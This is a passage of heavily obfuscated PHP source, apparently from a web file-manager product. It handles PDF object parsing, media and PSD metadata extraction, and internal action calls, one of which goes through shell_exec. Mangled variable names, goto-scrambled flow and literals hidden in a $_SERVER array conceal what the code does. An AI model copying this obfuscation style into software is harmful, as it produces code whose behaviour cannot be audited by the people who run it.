strcspn($dÖà½‰¼ğ¾, $f›™õ™³Ì´[1597], $cÙ×•”É); if ($e‡à³‹ƒ—¥ > 0) { $cÙ×•”É += $e‡à³‹ƒ—¥; return self::getRawObject($dÖà½‰¼ğ¾, $cÙ×•”É); } break; case $f›™õ™³Ì´[8]: $bÍÀ¿«ô·È = $C ”›ñÍ§«; ++$cÙ×•”É; $bÙÍÛ·§Ş = preg_match($f›™õ™³Ì´[1598], substr($dÖà½‰¼ğ¾, $cÙ×•”É, 256), $fÎ‹ßœè); if (1 == $bÙÍÛ·§Ş) { $EĞß«ÎæÚ = $fÎ‹ßœè[1]; $cÙ×•”É += strlen($EĞß«ÎæÚ); } break; case $f›™õ™³Ì´[257]: case $f›™õ™³Ì´[823]: $bÍÀ¿«ô·È = $C ”›ñÍ§«; ++$cÙ×•”É; $B«òÎãò = $cÙ×•”É; if ($f›™õ™³Ì´[257] == $C ”›ñÍ§«) { $A¿ò´ß‘Ú = 1; while ($A¿ò´ß‘Ú > 0) { if (!isset($dÖà½‰¼ğ¾[$B«òÎãò])) { break; } $B¥Ñ×Ïï¬³ = $dÖà½‰¼ğ¾[$B«òÎãò]; switch ($B¥Ñ×Ïï¬³) { case $f›™õ™³Ì´[103]: ++$B«òÎãò; break; case $f›™õ™³Ì´[257]: ++$A¿ò´ß‘Ú; break; case $f›™õ™³Ì´[823]: --$A¿ò´ß‘Ú; break; } ++$B«òÎãò; } $EĞß«ÎæÚ = substr($dÖà½‰¼ğ¾, $cÙ×•”É, $B«òÎãò - $cÙ×•”É - 1); $cÙ×•”É = $B«òÎãò; } break; case $f›™õ™³Ì´[167]: case $f›™õ™³Ì´[484]: $bÍÀ¿«ô·È = $C ”›ñÍ§«; ++$cÙ×•”É; if ($f›™õ™³Ì´[167] == $C ”›ñÍ§«) { $EĞß«ÎæÚ = array(); do { $E“™…îù¶  = $cÙ×•”É; $D‹ò©‘¨Ş® = self::getRawObject($dÖà½‰¼ğ¾, $cÙ×•”É); $cÙ×•”É = $D‹ò©‘¨Ş®[2]; $EĞß«ÎæÚ[] = $D‹ò©‘¨Ş®; } while ($f›™õ™³Ì´[484] != $D‹ò©‘¨Ş®[0] && $cÙ×•”É != $E“™…îù¶ ); array_pop($EĞß«ÎæÚ); } break; case $f›™õ™³Ì´[931]: case $f›™õ™³Ì´[934]: if (isset($dÖà½‰¼ğ¾[$cÙ×•”É + 1]) && $dÖà½‰¼ğ¾[$cÙ×•”É + 1] == $C ”›ñÍ§«) { $bÍÀ¿«ô·È = $C ”›ñÍ§« . $C ”›ñÍ§«; $cÙ×•”É += 2; if ($f›™õ™³Ì´[931] == $C ”›ñÍ§«) { $EĞß«ÎæÚ = array(); do { $E“™…îù¶  = $cÙ×•”É; $D‹ò©‘¨Ş® = self::getRawObject($dÖà½‰¼ğ¾, $cÙ×•”É); $cÙ×•”É = $D‹ò©‘¨Ş®[2]; $EĞß«ÎæÚ[] = $D‹ò©‘¨Ş®; } while ($f›™õ™³Ì´[1599] != $D‹ò©‘¨Ş®[0] && $cÙ×•”É != $E“™…îù¶ ); array_pop($EĞß«ÎæÚ); } } else { $bÍÀ¿«ô·È = $C ”›ñÍ§«; ++$cÙ×•”É; $bÙÍÛ·§Ş = preg_match($f›™õ™³Ì´[1600], substr($dÖà½‰¼ğ¾, $cÙ×•”É), $fÎ‹ßœè); if ($f›™õ™³Ì´[931] == $C ”›ñÍ§« && 1 == $bÙÍÛ·§Ş) { $EĞß«ÎæÚ = strtr($fÎ‹ßœè[1], $f›™õ™³Ì´[1601], $f›™õ™³Ì´[33]); $cÙ×•”É += \strlen($fÎ‹ßœè[0]); } elseif (!1 !== ($C§©¶½ó¼ = strpos($dÖà½‰¼ğ¾, $f›™õ™³Ì´[934], $cÙ×•”É))) { $cÙ×•”É = $C§©¶½ó¼ + 1; } } break; default: if ($f›™õ™³Ì´[1602] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 6)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1602]; $cÙ×•”É += 6; } elseif ($f›™õ™³Ì´[109] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 4)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[109]; $cÙ×•”É += 4; $EĞß«ÎæÚ = $f›™õ™³Ì´[109]; } elseif ($f›™õ™³Ì´[1603] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 4)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1604]; $cÙ×•”É += 4; $EĞß«ÎæÚ = $f›™õ™³Ì´[1603]; } elseif ($f›™õ™³Ì´[1605] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 5)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1604]; $cÙ×•”É += 5; $EĞß«ÎæÚ = $f›™õ™³Ì´[1605]; } elseif ($f›™õ™³Ì´[1606] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 6)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1606]; $cÙ×•”É += 6; if (1 == preg_match($f›™õ™³Ì´[1607], substr($dÖà½‰¼ğ¾, $cÙ×•”É), $fÎ‹ßœè)) { $cÙ×•”É += strlen($fÎ‹ßœè[0]); $aä‘¶Œª¾Ü = $f›™õ™³Ì´[1608]; $bÙÍÛ·§Ş = preg_match($aä‘¶Œª¾Ü, substr($dÖà½‰¼ğ¾, $cÙ×•”É), $fÎ‹ßœè, PREG_OFFSET_CAPTURE); if (1 == $bÙÍÛ·§Ş) { $EĞß«ÎæÚ = substr($dÖà½‰¼ğ¾, $cÙ×•”É, $fÎ‹ßœè[0][1]); $cÙ×•”É += $fÎ‹ßœè[1][1]; } } } elseif ($f›™õ™³Ì´[1609] == substr($dÖà½‰¼ğ¾, $cÙ×•”É, 9)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1609]; $cÙ×•”É += 9; } elseif (1 == preg_match($f›™õ™³Ì´[1610], substr($dÖà½‰¼ğ¾, $cÙ×•”É, 33), $fÎ‹ßœè)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1572]; $cÙ×•”É += strlen($fÎ‹ßœè[0]); $EĞß«ÎæÚ = intval($fÎ‹ßœè[1]) . $f›™õ™³Ì´[80] . intval($fÎ‹ßœè[2]); } elseif (1 == preg_match($f›™õ™³Ì´[1611], substr($dÖà½‰¼ğ¾, $cÙ×•”É, 33), $fÎ‹ßœè)) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1612]; $EĞß«ÎæÚ = intval($fÎ‹ßœè[1]) . $f›™õ™³Ì´[80] . intval($fÎ‹ßœè[2]); $cÙ×•”É += strlen($fÎ‹ßœè[0]); } elseif (($BøË¼´…Ôˆ = strspn($dÖà½‰¼ğ¾, $f›™õ™³Ì´[1613], $cÙ×•”É)) > 0) { $bÍÀ¿«ô·È = $f›™õ™³Ì´[1614]; $EĞß«ÎæÚ = substr($dÖà½‰¼ğ¾, $cÙ×•”É, $BøË¼´…Ôˆ); $cÙ×•”É += $BøË¼´…Ôˆ; } break; } goto e¶¤˜¯¶ªÖ; e¶¤˜¯¶ªÖ: return array($bÍÀ¿«ô·È, $EĞß«ÎæÚ, $cÙ×•”É); goto Aµ†ŒÔ›é´; e•ööÇ¿ø«: $f›™õ™³Ì´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÍÀ¿«ô·È = $f›™õ™³Ì´[33]; $EĞß«ÎæÚ = $f›™õ™³Ì´[33]; goto bœ´˜Ñ……Ş; Aµ†ŒÔ›é´: } } class GetInfo { private static $fileTypeArray; public static function get($f¨ÀÄíƒä ) { $d‡àÖÒ¸Ğù = IO::info($f¨ÀÄíƒä ); return self::infoAdd($d‡àÖÒ¸Ğù); } public static function infoAdd(&$bÍºğ¹¼…¹) { goto AÆèŞ…ÕˆÇ; BõáŠò›ª“: if (!$bÍºğ¹¼…¹ || $bÍºğ¹¼…¹[$E±ğæ ÷¡[29]] != $E±ğæ ÷¡[177]) { return; } if (!self::support($bÍºğ¹¼…¹[$E±ğæ ÷¡[170]]) || isset($bÍºğ¹¼…¹[$E±ğæ ÷¡[434]])) { return; } $d¦´ó¸ƒ’³ = $E±ğæ ÷¡[1616] . $bÍºğ¹¼…¹[$E±ğæ ÷¡[85]]; goto c¹šÓ³ÊæÕ; c¹šÓ³ÊæÕ: $fŠ¬öŒŒ« = $bÍºğ¹¼…¹[$E±ğæ ÷¡[170]]; try { if ($bÍºğ¹¼…¹[$E±ğæ ÷¡[170]] == $E±ğæ ÷¡[1617]) { $F¯ö¤ƒÑ‰ = self::psdParse($d¦´ó¸ƒ’³); $fŠ¬öŒŒ« = $E±ğæ ÷¡[1618]; } else { if ($bÍºğ¹¼…¹[$E±ğæ ÷¡[170]] == $E±ğæ ÷¡[1619]) { $F¯ö¤ƒÑ‰ = self::pdfParse($d¦´ó¸ƒ’³); } else { $fŠ¬öŒŒ« = self::$fileTypeArray[$E±ğæ ÷¡[1620]][$bÍºğ¹¼…¹[$E±ğæ ÷¡[170]]]; $E‹¨–ĞÑ˜Í = self::$fileTypeArray[$E±ğæ ÷¡[1621]][$fŠ¬öŒŒ«][$E±ğæ ÷¡[1622]]; $EÑ½Ê˜¤†Ò = @$B•—ìéÖˆé->analyze($d¦´ó¸ƒ’³, $bÍºğ¹¼…¹[$E±ğæ ÷¡[87]], $bÍºğ¹¼…¹[$E±ğæ ÷¡[28]]); $F¯ö¤ƒÑ‰ = self::parseData($EÑ½Ê˜¤†Ò, $E‹¨–ĞÑ˜Í, $bÍºğ¹¼…¹); } } } catch (Exception $AŒóÀ¬‚†) { $F¯ö¤ƒÑ‰ = array($E±ğæ ÷¡[380] => $fŠ¬öŒŒ«); } if (!$F¯ö¤ƒÑ‰) { return; } goto c„‘‘øÛî¬; AÆèŞ…ÕˆÇ: $E±ğæ ÷¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; static $B•—ìéÖˆé; if (!$B•—ìéÖˆé) { require SDK_DIR . $E±ğæ ÷¡[1615]; $B•—ìéÖˆé = new getID3(); } goto BõáŠò›ª“; c„‘‘øÛî¬: $F¯ö¤ƒÑ‰[$E±ğæ ÷¡[380]] = $fŠ¬öŒŒ«; $bÍºğ¹¼…¹[$E±ğæ ÷¡[434]] = $F¯ö¤ƒÑ‰; return $bÍºğ¹¼…¹; goto B¹‹£‹ƒå¨; B¹‹£‹ƒå¨: } public static function support($dÔšêäöï‘) { goto eµ„ÛÔ“í„; eµ„ÛÔ“í„: $A·‚¸°à† =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $dÔšêäöï‘ = strtolower($dÔšêäöï‘); goto CÛç¼Ì‡ç; cóÕê„¿à…: return !1; goto FÎèÓ«¥‰; CÛç¼Ì‡ç: $D‹¤“ƒÎĞ = array($A·‚¸°à†[1619], $A·‚¸°à†[1617]); if (in_array($dÔšêäöï‘, $D‹¤“ƒÎĞ)) { return !0; } if (isset(self::$fileTypeArray[$A·‚¸°à†[1620]][$dÔšêäöï‘])) { return !0; } goto cóÕê„¿à…; FÎèÓ«¥‰: } private static function parseData($FÁØí£ÍÚ, $DƒòÃ÷ˆÃ, $C”†Œ©ôêí) { $C¥„¥¯º» =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÖÙĞÔÌ×Û = $FÁØí£ÍÚ[$C¥„¥¯º»[1623]]; $F¡ñŠ´‹ŸÕ = array(); foreach ($DƒòÃ÷ˆÃ as $b·õ–Œ©ÉÎ => $DªÇéàÃœÍ) { foreach ($DªÇéàÃœÍ as $fê¨™ÒÂ) { if (is_array($fê¨™ÒÂ)) { $D„‹·ƒá¹ = self::parseData($FÁØí£ÍÚ, $DªÇéàÃœÍ, $C”†Œ©ôêí); if ($D„‹·ƒá¹) { $F¡ñŠ´‹ŸÕ[$b·õ–Œ©ÉÎ] = $D„‹·ƒá¹; } break; } $Cô§èè£Ÿù = str_replace($C¥„¥¯º»[1393], $eÖÙĞÔÌ×Û, $fê¨™ÒÂ); $D„‹·ƒá¹ = _get($FÁØí£ÍÚ, $Cô§èè£Ÿù); $D„‹·ƒá¹ = is_array($D„‹·ƒá¹) ? $D„‹·ƒá¹[0] : $D„‹·ƒá¹; if ($D„‹·ƒá¹) { break; } } if ($D„‹·ƒá¹ || $D„‹·ƒá¹ === 0 || $D„‹·ƒá¹ === !1) { $D„‹·ƒá¹ = self::valueReset($fê¨™ÒÂ, $D„‹·ƒá¹, $b·õ–Œ©ÉÎ); if ($D„‹·ƒá¹ !== null) { $F¡ñŠ´‹ŸÕ[$b·õ–Œ©ÉÎ] = $D„‹·ƒá¹; } } } $F¡ñŠ´‹ŸÕ = self::valueResetAll($F¡ñŠ´‹ŸÕ, $C”†Œ©ôêí); return $F¡ñŠ´‹ŸÕ; } private static function psdParse($a¥¾Àò‰) { $cÜ×ÒÑÅ‹Ö =& $_SERVER[¶ªÕß‚ØÁŸ]; if (IO::fileSubstr($a¥¾Àò‰, 0, 4) != $cÜ×ÒÑÅ‹Ö[1624]) { return !1; } $d»Ç˜ŒÄä = getImageSize($a¥¾Àò‰, $f¦°ÀŞ¬‹Š); if (!$d»Ç˜ŒÄä) { return; } $aôÉµ¬¨Œ = array($cÜ×ÒÑÅ‹Ö[1539] => $d»Ç˜ŒÄä[0], $cÜ×ÒÑÅ‹Ö[1541] => $d»Ç˜ŒÄä[1]); return $aôÉµ¬¨Œ; } private static function pdfParse($B¿¹ª¤ŒÑ’) { return FileParsePdf::parse($B¿¹ª¤ŒÑ’); } private static function fileTypeParse() { $eƒæÀ¦¢»Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; $eô¸ …‹‚ = self::fileTypeArray(); $A—ëÁËİ†Û = array(); foreach ($eô¸ …‹‚ as $a‹šïËà¬’ => $FÎù¨ÌÅ) { $FÍ‚‰¸Åô = _get($FÎù¨ÌÅ, $eƒæÀ¦¢»Ç[170], $eƒæÀ¦¢»Ç[33]); $d—È‚¤ßÂÀ = is_string($FÍ‚‰¸Åô) ? explode($eƒæÀ¦¢»Ç[47], $FÍ‚‰¸Åô) : $FÍ‚‰¸Åô; if (!$d—È‚¤ßÂÀ) { continue; } foreach ($d—È‚¤ßÂÀ as $FÍ‚‰¸Åô) { $FÍ‚‰¸Åô = strtolower(trim($FÍ‚‰¸Åô)); if (!$FÍ‚‰¸Åô) { continue; } $A—ëÁËİ†Û[$FÍ‚‰¸Åô] = $a‹šïËà¬’; } $eô¸ …‹‚[$a‹šïËà¬’][$eƒæÀ¦¢»Ç[170]] = array_keys($A—ëÁËİ†Û); $eô¸ …‹‚[$a‹šïËà¬’][$eƒæÀ¦¢»Ç[1622]] = self::parseKeyMap($FÎù¨ÌÅ[$eƒæÀ¦¢»Ç[1622]]); } return array($eƒæÀ¦¢»Ç[1621] => $eô¸ …‹‚, $eƒæÀ¦¢»Ç[1620] => $A—ëÁËİ†Û); } private static function parseKeyMap($f‰Õ¢á’ºĞ) { $CØçˆ¹Ç±À =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($f‰Õ¢á’ºĞ as $c­Ãöì«£¦ => $e‡¹êÅåá) { if (is_array($e‡¹êÅåá)) { $dŸËŒí–‚Ò = self::parseKeyMap($e‡¹êÅåá); if ($dŸËŒí–‚Ò) { $f‰Õ¢á’ºĞ[$c­Ãöì«£¦] = $dŸËŒí–‚Ò; } continue; } $eŸç³£šŠ‚ = explode($CØçˆ¹Ç±À[47], $e‡¹êÅåá); $Cé†÷ƒêÏ = array(); foreach ($eŸç³£šŠ‚ as $Cğ¾Õ–²Ñš) { $Cğ¾Õ–²Ñš = trim($Cğ¾Õ–²Ñš); if (!$Cğ¾Õ–²Ñš) { continue; } if (preg_match($CØçˆ¹Ç±À[1625], $Cğ¾Õ–²Ñš, $aâÛÚƒ®®ª)) { $B­¼ëÚêãš = explode($CØçˆ¹Ç±À[280], $aâÛÚƒ®®ª[1]); foreach ($B­¼ëÚêãš as $d‘…ÜÓ¯¤) { $Cé†÷ƒêÏ[] = str_replace($aâÛÚƒ®®ª[0], $d‘…ÜÓ¯¤, $Cğ¾Õ–²Ñš); } } else { $Cé†÷ƒêÏ[] = $Cğ¾Õ–²Ñš; } } $f‰Õ¢á’ºĞ[$c­Ãöì«£¦] = $Cé†÷ƒêÏ; } return $f‰Õ¢á’ºĞ; } private static function valueResetAll($fÜì‹ÕÚËÕ, $F«…É¿Œ‹½) { goto AÎçµÑğ§; fõ®ƒ°â±É: return $fÜì‹ÕÚËÕ; goto b–Ö¬åéÍ; AÎçµÑğ§: $eºçùîÀ„Å =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1626]])) { $c¸àÌŒ±‚ = ceil($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1626]]); $FÇèÆ¡áÆ = intval($c¸àÌŒ±‚ / 3600); $b¹÷õäÈÄ± = intval(($c¸àÌŒ±‚ - $FÇèÆ¡áÆ * 3600) / 60); $aˆ‚ôøîÔ = $c¸àÌŒ±‚ % 60; $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1627]] = sprintf($eºçùîÀ„Å[1628], $FÇèÆ¡áÆ, $b¹÷õäÈÄ±, $aˆ‚ôøîÔ); if ($FÇèÆ¡áÆ == 0) { $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1627]] = sprintf($eºçùîÀ„Å[1629], $b¹÷õäÈÄ±, $aˆ‚ôøîÔ); } } $f„“¦ºÙà¼ = _get($fÜì‹ÕÚËÕ, $eºçùîÀ„Å[1630]); goto FÇ¸²×’ˆ; FÇ¸²×’ˆ: if ($f„“¦ºÙà¼) { $fàäÜ¿í¿Ü = IO_PATH_SYSTEM_TEMP . $eºçùîÀ„Å[1631] . KodIO::hashPath($F«…É¿Œ‹½) . $eºçùîÀ„Å[1632]; $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1633]] = Action($eºçùîÀ„Å[1634])->pluginCacheFileSet($fàäÜ¿í¿Ü, $f„“¦ºÙà¼); unset($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1618]]); } $Eö‚İ‹Œ„Ó = _get($fÜì‹ÕÚËÕ, $eºçùîÀ„Å[1636], $eºçùîÀ„Å[33]); $aŠ¼¦¦çªŸ = _get($fÜì‹ÕÚËÕ, $eºçùîÀ„Å[1637], $eºçùîÀ„Å[33]); goto d¿ìÌ…‹¨å; d¿ìÌ…‹¨å: $FâŒ×«»éõ = _get($fÜì‹ÕÚËÕ, $eºçùîÀ„Å[1638], $eºçùîÀ„Å[33]); $E½ÌÎĞ¿Ø£ = $Eö‚İ‹Œ„Ó . $aŠ¼¦¦çªŸ . $FâŒ×«»éõ; if ($E½ÌÎĞ¿Ø£ && get_charset($E½ÌÎĞ¿Ø£) != $eºçùîÀ„Å[335]) { $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1346]] = iconv_to($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1346]], get_charset($E½ÌÎĞ¿Ø£), $eºçùîÀ„Å[335]); $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1639]] = iconv_to($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1639]], get_charset($E½ÌÎĞ¿Ø£), $eºçùîÀ„Å[335]); $fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1640]] = iconv_to($fÜì‹ÕÚËÕ[$eºçùîÀ„Å[1635]][$eºçùîÀ„Å[1640]], get_charset($E½ÌÎĞ¿Ø£), $eºçùîÀ„Å[335]); } goto fõ®ƒ°â±É; b–Ö¬åéÍ: } private static function valueReset($b·±ÄŠøÎ, $B«ìò·ÈË‰, $céÊñã°”–) { $CÍ”˜ºÎ×õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¨„î ©à = $CÍ”˜ºÎ×õ[1556]; switch ($b·±ÄŠøÎ) { case $CÍ”˜ºÎ×õ[1641]: $B«ìò·ÈË‰ = $B«ìò·ÈË‰ == $CÍ”˜ºÎ×õ[93] ? $CÍ”˜ºÎ×õ[1642] : $CÍ”˜ºÎ×õ[1643]; break; case $CÍ”˜ºÎ×õ[1644]: $B«ìò·ÈË‰ = $B«ìò·ÈË‰ ? $B«ìò·ÈË‰ : null; break; default: break; } switch ($céÊñã°”–) { case $CÍ”˜ºÎ×õ[1645]: $B«ìò·ÈË‰ = round($B«ìò·ÈË‰, 2); break; case $CÍ”˜ºÎ×õ[197]: case $CÍ”˜ºÎ×õ[117]: if ($B«ìò·ÈË‰ < 0) { $B«ìò·ÈË‰ = null; } else { if (is_numeric($B«ìò·ÈË‰)) { $B«ìò·ÈË‰ = date($B¨„î ©à, $B«ìò·ÈË‰); } } break; default: break; } return $B«ìò·ÈË‰; } private static function fileTypeArray() { $aØ•¾¶£—¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($aØ•¾¶£—¬[1618] => array($aØ•¾¶£—¬[170] => $aØ•¾¶£—¬[1646] . $aØ•¾¶£—¬[1647], $aØ•¾¶£—¬[1622] => array($aØ•¾¶£—¬[1539] => $aØ•¾¶£—¬[1648], $aØ•¾¶£—¬[1541] => $aØ•¾¶£—¬[1649], $aØ•¾¶£—¬[1650] => $aØ•¾¶£—¬[1651], $aØ•¾¶£—¬[1652] => $aØ•¾¶£—¬[1653], $aØ•¾¶£—¬[197] => $aØ•¾¶£—¬[1654], $aØ•¾¶£—¬[117] => $aØ•¾¶£—¬[1655], $aØ•¾¶£—¬[1656] => $aØ•¾¶£—¬[1657], $aØ•¾¶£—¬[1658] => $aØ•¾¶£—¬[1659], $aØ•¾¶£—¬[1660] => $aØ•¾¶£—¬[1661], $aØ•¾¶£—¬[1662] => $aØ•¾¶£—¬[1663], $aØ•¾¶£—¬[1664] => $aØ•¾¶£—¬[1665], $aØ•¾¶£—¬[1666] => $aØ•¾¶£—¬[1667], $aØ•¾¶£—¬[1668] => $aØ•¾¶£—¬[1669], $aØ•¾¶£—¬[1670] => array($aØ•¾¶£—¬[1671] => $aØ•¾¶£—¬[1672], $aØ•¾¶£—¬[1673] => $aØ•¾¶£—¬[1674], $aØ•¾¶£—¬[1675] => $aØ•¾¶£—¬[1676]), $aØ•¾¶£—¬[1677] => $aØ•¾¶£—¬[1678], $aØ•¾¶£—¬[1679] => $aØ•¾¶£—¬[1680], $aØ•¾¶£—¬[1681] => $aØ•¾¶£—¬[1682], $aØ•¾¶£—¬[1683] => $aØ•¾¶£—¬[1684], $aØ•¾¶£—¬[1685] => array($aØ•¾¶£—¬[1686] => $aØ•¾¶£—¬[1687], $aØ•¾¶£—¬[1688] => $aØ•¾¶£—¬[1689], $aØ•¾¶£—¬[1690] => $aØ•¾¶£—¬[1691], $aØ•¾¶£—¬[1692] => $aØ•¾¶£—¬[1693], $aØ•¾¶£—¬[1694] => $aØ•¾¶£—¬[1695], $aØ•¾¶£—¬[1696] => $aØ•¾¶£—¬[1697], $aØ•¾¶£—¬[1698] => $aØ•¾¶£—¬[1699], $aØ•¾¶£—¬[1700] => $aØ•¾¶£—¬[1701], $aØ•¾¶£—¬[1702] => $aØ•¾¶£—¬[1703], $aØ•¾¶£—¬[1704] => $aØ•¾¶£—¬[1705], $aØ•¾¶£—¬[1706] => $aØ•¾¶£—¬[1707]))), $aØ•¾¶£—¬[1708] => array($aØ•¾¶£—¬[170] => $aØ•¾¶£—¬[1709] . $aØ•¾¶£—¬[1710], $aØ•¾¶£—¬[1622] => array($aØ•¾¶£—¬[1626] => $aØ•¾¶£—¬[1711], $aØ•¾¶£—¬[197] => $aØ•¾¶£—¬[1712], $aØ•¾¶£—¬[117] => $aØ•¾¶£—¬[1713], $aØ•¾¶£—¬[1658] => $aØ•¾¶£—¬[1714], $aØ•¾¶£—¬[1715] => $aØ•¾¶£—¬[1716], $aØ•¾¶£—¬[1717] => $aØ•¾¶£—¬[1644], $aØ•¾¶£—¬[1718] => $aØ•¾¶£—¬[1719], $aØ•¾¶£—¬[1720] => $aØ•¾¶£—¬[1721], $aØ•¾¶£—¬[1722] => $aØ•¾¶£—¬[1723], $aØ•¾¶£—¬[1635] => array($aØ•¾¶£—¬[1346] => $aØ•¾¶£—¬[1724], $aØ•¾¶£—¬[1639] => $aØ•¾¶£—¬[1725], $aØ•¾¶£—¬[1640] => $aØ•¾¶£—¬[1726], $aØ•¾¶£—¬[1727] => $aØ•¾¶£—¬[1728], $aØ•¾¶£—¬[1729] => $aØ•¾¶£—¬[1730], $aØ•¾¶£—¬[1731] => $aØ•¾¶£—¬[1732], $aØ•¾¶£—¬[1618] => $aØ•¾¶£—¬[1733]))), $aØ•¾¶£—¬[1734] => array($aØ•¾¶£—¬[170] => $aØ•¾¶£—¬[1735] . $aØ•¾¶£—¬[1736], $aØ•¾¶£—¬[1622] => array($aØ•¾¶£—¬[1539] => $aØ•¾¶£—¬[1737], $aØ•¾¶£—¬[1541] => $aØ•¾¶£—¬[1738], $aØ•¾¶£—¬[1626] => $aØ•¾¶£—¬[1711], $aØ•¾¶£—¬[197] => $aØ•¾¶£—¬[1739], $aØ•¾¶£—¬[117] => $aØ•¾¶£—¬[1740], $aØ•¾¶£—¬[1645] => $aØ•¾¶£—¬[1741], $aØ•¾¶£—¬[1722] => $aØ•¾¶£—¬[1742], $aØ•¾¶£—¬[1718] => $aØ•¾¶£—¬[1743], $aØ•¾¶£—¬[1658] => $aØ•¾¶£—¬[1744], $aØ•¾¶£—¬[1708] => array($aØ•¾¶£—¬[1717] => $aØ•¾¶£—¬[1644], $aØ•¾¶£—¬[1745] => $aØ•¾¶£—¬[1746], $aØ•¾¶£—¬[1715] => $aØ•¾¶£—¬[1716], $aØ•¾¶£—¬[1722] => $aØ•¾¶£—¬[1723], $aØ•¾¶£—¬[1718] => $aØ•¾¶£—¬[1747], $aØ•¾¶£—¬[1720] => $aØ•¾¶£—¬[1721]))), $aØ•¾¶£—¬[1748] => array($aØ•¾¶£—¬[1622] => array($aØ•¾¶£—¬[1749] => $aØ•¾¶£—¬[1750], $aØ•¾¶£—¬[1751] => $aØ•¾¶£—¬[1752])), $aØ•¾¶£—¬[1753] => array($aØ•¾¶£—¬[1622] => array())); } } goto Dˆ®ÑÂÂ‚‚; bÖš’¢ˆ¸§: function ActionCall($d˜¬µĞéŠ) { $Aò‘äÚ÷Å‘ = array_slice(func_get_args(), 1); return ActionApply($d˜¬µĞéŠ, $Aò‘äÚ÷Å‘); } function ActionCallApi($DÙ·®Ş×, $e­º¾†±×÷ = '') { goto a‘¢‹Í‡¦; c¸¹ÑÅ©ƒ: $dƒÔ íŸ« = Action($Aä‰œÄÒå[23])->accessToken(); $DÙ·®Ş× = str_replace($Aä‰œÄÒå[5], $Aä‰œÄÒå[4], $DÙ·®Ş×) . $Aä‰œÄÒå[24] . $dƒÔ íŸ« . $f‚’Š«¨Œ; $bóô®‘— = $Aä‰œÄÒå[20]; goto B…ÓÀî”æ­; c…¾Î®¾¿¶: $CŠ˜Â¥İ‹Ÿ = json_decode($bóô®‘—, !0); $b³ç›ŞĞ¬Ó = is_array($CŠ˜Â¥İ‹Ÿ) ? $CŠ˜Â¥İ‹Ÿ : array($Aä‰œÄÒå[33] => null, $Aä‰œÄÒå[34] => $bóô®‘—); if (!$CŠ˜Â¥İ‹Ÿ) { echo $bóô®‘—; } goto c„Ä»¶¦; c„Ä»¶¦: return $b³ç›ŞĞ¬Ó; goto B¯Äƒ’¿„¶; B…ÓÀî”æ­: $A÷·º÷„Ü = phpBinCommand(); if ($A÷·º÷„Ü && function_exists($Aä‰œÄÒå[25])) { $C¢×â†Õ¾õ = $A÷·º÷„Ü . $Aä‰œÄÒå[26] . BASIC_PATH . $Aä‰œÄÒå[27] . escapeshellarg($DÙ·®Ş×); $bóô®‘— = shell_exec($C¢×â†Õ¾õ); } if (!$bóô®‘—) { $f‚•ñ°¢® = stream_context_create(array($Aä‰œÄÒå[28] => array($Aä‰œÄÒå[29] => 20, $Aä‰œÄÒå[30] => $Aä‰œÄÒå[31]))); $bóô®‘— = file_get_contents(APP_HOST . $Aä‰œÄÒå[32] . $DÙ·®Ş×, !1, $f‚•ñ°¢®); } goto c…¾Î®¾¿¶; a‘¢‹Í‡¦: $Aä‰œÄÒå =& $_SERVER[œˆâ˜åÊâè]; $f‚’Š«¨Œ = $e­º¾†±×÷; if (is_array($e­º¾†±×÷)) { $f‚’Š«¨Œ = $Aä‰œÄÒå[20]; foreach ($e­º¾†±×÷ as $DØÒ²¤àÓ => $aÛ¸‰ä¥ô) { $aÛ¸‰ä¥ô = is_array($aÛ¸‰ä¥ô) ? json_encode($aÛ¸‰ä¥ô) : $aÛ¸‰ä¥ô; $aÛ¸‰ä¥ô = is_bool($aÛ¸‰ä¥ô) ? intval($aÛ¸‰ä¥ô) : $aÛ¸‰ä¥ô; $f‚’Š«¨Œ .= $Aä‰œÄÒå[21] . $DØÒ²¤àÓ . $Aä‰œÄÒå[22] . rawurlencode($aÛ¸‰ä¥ô); } } goto c¸¹ÑÅ©ƒ; B¯Äƒ’¿„¶: } function ActionCallHook($bø¸©ªåÛØ) { goto e«İÆí·á‘; D‡é›°¿èÑ: $GLOBALS[$F¬Æ”‡ë¤İ[35]] = 1; $CŞîí¦¶ì = ActionApply($bø¸©ªåÛØ, $D¤Á³¾äĞ); $bÄáĞ‘¶ê = ob_get_clean(); goto Bá˜ğĞÃ; e«İÆí·á‘: $F¬Æ”‡ë¤İ =& $_SERVER[œˆâ˜åÊâè]; ob_start(); $D¤Á³¾äĞ = array_slice(func_get_args(), 1); goto D‡é›°¿èÑ; Bá˜ğĞÃ: 